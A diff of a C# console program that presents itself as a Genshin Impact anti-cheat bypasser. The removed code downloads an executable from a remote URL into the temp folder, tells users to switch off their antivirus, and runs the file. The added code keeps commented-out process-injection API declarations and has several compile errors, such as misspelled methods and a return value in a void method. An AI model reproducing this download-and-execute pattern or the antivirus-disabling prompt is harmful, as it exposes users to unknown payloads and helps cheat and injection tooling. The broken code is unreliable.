@@ -1,60 +1,51 @@
 using System;
-using System.CodeDom.Compiler;
-using System.Data;
-using System.Diagnostics;
-using System.IO;
 using System.Linq;
+using System.Text;
 using System.Net;
+using System.Runtime.CompilerServices; 
+using System.Linq.Expressions;
+using Microsoft.CSharp.RuntimeBinder;
+using System.IO;
 using System.Threading;
+using System.Diagnostics;  
+using System.Runtime.InteropServices; 
+using System.CodeDom.Compiler;
+using System.Reflection;
+using System.Data;
+using System.Security.Principal;
+using System.Security.AccessControl;
 
 namespace Bypasser_Mhyprot2
 {
     public class Program
     {
+        [STAThread]
+		[DebuggerNonUserCode]
+		[GeneratedCode("PresentationBuildTasks", "1.0.0.0")]
         
-        static void Bypass()
+        public static void Main(string[] args)
         {
             
-            bool Program = false;
-            try
+            RandTitle();
+            
+            //Global 
+            if (Process.GetProcessByName("GenshinImpact").Lenght != 0)
             {
-                //credit to DesirePro(FUCK#9803)
-                WebClient webClient = new WebClient();
-                Console.WriteLine("Getting Bypasser Ready....");
-                webClient.DownloadFile(new Uri("https://github.com/DeftSolutions-dev/HackGenshin/raw/main/FuckYou/ggAC.exe"), Path.Combine(Path.GetTempPath(), "Bypass.exe"));
-                Console.WriteLine("Ready Set...");
-                
-                if (File.Exists(Path.Combine(Path.GetTempPath(), "Bypass.exe")) && new FileInfo(Path.Combine(Path.GetTempPath(), "Bypass.exe")).Length > 10L)
-                {
-                    Program = true;
-                }
-                else
-                {
-                    string msg_1 = "Turn Off Other Anti Virus";
-                    string msg_2 = "Bitdefender, Avast, Windows's Anti Virus";
-                    Console.WriteLine("Please Turn Off Anti-Virus");
-                    Console.WriteLine("Check These Anti Virus Are Running/Etc... -> \n");
-                    Console.WriteLine(msg_1 + msg_2);
-                    Console.ReadKey();
-                }
-                if (Program)
-                {
-                    Process.Start(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
-                }
+                Console.WriteLine("PROCESS FOUND");
             }
-            catch (WebException)
+            
+            //Chinese
+            if (Process.GetProcessByName("GenshinImpact").Lenght != 0)
             {
-                Console.WriteLine("No Internet Connection Detected, Please Try Again...");
-                Console.Beep();
-                Thread.Sleep(100);
+                Console.WriteLine("PROCESS FOUND");
             }
-            catch (Exception arg)
-            {
-                Console.WriteLine("Oops Somehing Went Wrong!" + arg);
-            }
+            
+            //not found
+            Console.WriteLine("START GENSHIN IMPACT");
+			Console.ReadKey();
         }
         
-        private static void RandomName()
+        private static void RandTitle()
         {
             Console.Title = "";
             Random rnd = new Random();
@@ -63,141 +54,91 @@ namespace Bypasser_Mhyprot2
                 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
                 '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
             };
-            
-            for (int r = 35; r < 75; r++)
-                Console.Title += pwdChars[rnd.Next(0, 60)];
+            for (int i = 20; i < 75; i++)
+            {
+                Console.Title += pwdChars[rnd.Next(0, 35)];
+            }
             Thread.Sleep(10);
         }
         
-        const string Chars = "awdauUWHU2Dw722322tyuawDawwGG3hwd";
-        static string RandomString(int length)
+        public static void LoadFile()
         {
-            Random random = new Random();
-            return new string(Enumerable.Repeat(Chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
-        }
-        
-        
-        [STAThread]
-        [DebuggerNonUserCode]
-        [GeneratedCode("PresentationBuildTasks", "1.2.0.0")]
-        
-        
-        public static void Main(string[] args)
-        {
-            RandomName();
-            if (Process.GetProcessesByName("GenshinImpact").Length != 0)
+            bool flag = false;
+            try
             {
-                Bypass();
-                Console.WriteLine("Bypassing Genshin Anti Cheat...");
-                Console.WriteLine("Closing Mhyprot2... Wait....");
-                Thread.Sleep(10);
-                Console.Clear();
-                Console.WriteLine("Bypassed \n " + "\n" + "\n");
-                Console.Beep();
-                Console.WriteLine(" credit to DesirePro(FUCK#9803) ");
-                Console.WriteLine(" Made By Dwaine#0572 ");
-                Console.ReadLine();
-                LoadFile();
-                return;
-            }
-
-            if (Process.GetProcessesByName("GenshinImpact").Length == 0)
-            {
-                int i = 0;
-                while (i < 5)
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | 
+                                                       SecurityProtocolType.Tls | 
+                                                       SecurityProtocolType.Tls11 | 
+                                                       SecurityProtocolType.Tls12;
+                
+                WebClient webClient = new WebClient();
+                Console.WriteLine("Retrieving...");
+                
+                if (File.Exists(Path.Combine(Path.GetTempPath(), "")) && new FileInfo(
+                    Path.Combine(Path.GetTempPath(), "")).Length > 200L)
+				{
+					flag = true;
+				}
+                else
                 {
-                    RandomName();
-                    i++;
+                    return 0;
                 }
-                using (Process process = Process.Start("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Genshin Impact\\Genshin Impact.lnk"))
+                
+                if (flag)
                 {
-                    process.WaitForInputIdle();
-                    Console.WriteLine("Launcher.exe PID : " + process.Id);
-                    Process[] processCollection = Process.GetProcesses();
-                    Console.WriteLine("Wait While The Program Is Listening To Process \n");
-                    foreach (Process p in processCollection)
-                    {
-                        Console.WriteLine(p.ProcessName);
-
-                    }
-                    String[] sentences =
-                    {
-                        "Genshin Impact",
-                        "GenshinImpact",
-                        "Genshin Impact.exe",
-                        "GenshinImpact.exe"
-                    };
-                    foreach (string s in sentences)
-                    {
-                        if (Process.GetProcessesByName("GenshinImpact").Length != 0)
-                        {
-                            Console.WriteLine("Process Found...");
-                        }
-                        else
-                        {
-                            Console.WriteLine("Process Not Found...");
-                        }
-                    }
-                }
-            }
-
-            RandomName();
-            Console.WriteLine("Cannot Bypass...");
-            Console.WriteLine("Open Genshin Impact");
-            Thread.Sleep(100);
-            Console.Clear();
-            Console.Beep();
-            Console.WriteLine("Instruction : \n");
-            Console.WriteLine("Load Into The Game Completely");
-            Console.WriteLine("Reopen This Bypasser");
-            Console.Clear();
-            Console.WriteLine("Wait While The Program Is Listening To Process");
-            Console.WriteLine("Opened Luncher For You... \n");
-            Console.WriteLine("Load The Game Completely and Open This Bypasser");
-            Console.WriteLine("Beep Sound = Succesfully Bypassed \n" + "\n");
-            Console.WriteLine("Process ID Of Genshin Impact Cannot Found... \n" + "\n");
-            Thread.Sleep(10);
-            Console.WriteLine("credit to DesirePro(FUCK#9803)");
-            Console.WriteLine("Made By Dwaine#0572 \n");
-            Thread.Sleep(10000);
-            Console.Clear();
-
-            for (int a = 5; a >= 0; a--)
-            {
-                Console.Write("\rClosing Program in {0:00}", a + "\n");
-                System.Threading.Thread.Sleep(1000);
-                Console.WriteLine("credit to DesirePro(FUCK#9803)");
-                Console.WriteLine("Made By Dwaine#0572");
-            }
-            Environment.Exit(1);
-            Console.ReadKey();
-        }
-
-        private static void LoadFile()
-        {
-            bool DelProg = false;
-            if (DelProg)
-            {
-                try
-                {
+                    //bypass
                     File.Delete(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
-                    var tmpPath = Path.GetTempPath();
-                    var files = Directory.GetFiles(tmpPath, "*.*", SearchOption.AllDirectories);
-                    foreach (var file in files)
-                    {
-                        if (File.Exists(file))
-                        {
-                            File.Delete(file);
-                        }
-                    }
+                    Thread.Sleep(100);
                 }
-                catch
-                {
-                    File.Delete(Path.Combine(Path.GetTempPath(), "Bypass.exe"));
-                    Console.WriteLine("Something Went Wrong !, No Big Deal...");
-                    Enviroment.Exit(1);
-                }
+                
+            }
+            catch (Exception arg)
+            {
+                Console.WriteLine("Error! " + arg);
+				Console.ReadKey();
+            }
+            catch (WebException)
+            {
+                Console.WriteLine("No internet connection!");
+				Console.ReadKey();
             }
         }
+        
+        
+//         [Flags]
+//         public enum ProcessAccessFlags : uint
+//         {
+//             All = 0x001F0FFF,
+// 			Terminate = 0x00000001,
+// 			CreateThread = 0x00000002,
+// 			VirtualMemoryOperation = 0x00000008,
+// 			VirtualMemoryRead = 0x00000010,
+// 			VirtualMemoryWrite = 0x00000020,
+// 			DuplicateHandle = 0x00000040,
+// 			CreateProcess = 0x000000080,
+// 			SetQuota = 0x00000100,
+// 			SetInformation = 0x00000200,
+// 			QueryInformation = 0x00000400,
+// 			QueryLimitedInformation = 0x00001000,
+// 			Synchronize = 0x00100000
+//         }
+        
+//         [DllImport("kernel32.dll", SetLastError = true)]
+// 		private static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
+// 		[DllImport("kernel32.dll", SetLastError = true)]
+// 		[return: MarshalAs(UnmanagedType.Bool)]
+// 		private static extern bool CloseHandle(IntPtr hObject);
+// 		[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+// 		public static extern IntPtr GetModuleHandle(string lpModuleName);
+// 		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+// 		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+// 		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
+// 		private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+// 		[DllImport("kernel32.dll")]
+// 		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+// 		[DllImport("kernel32.dll", SetLastError = true)]
+// 		private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+// 		[DllImport("kernel32.dll")]
+// 		static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
     }
 }
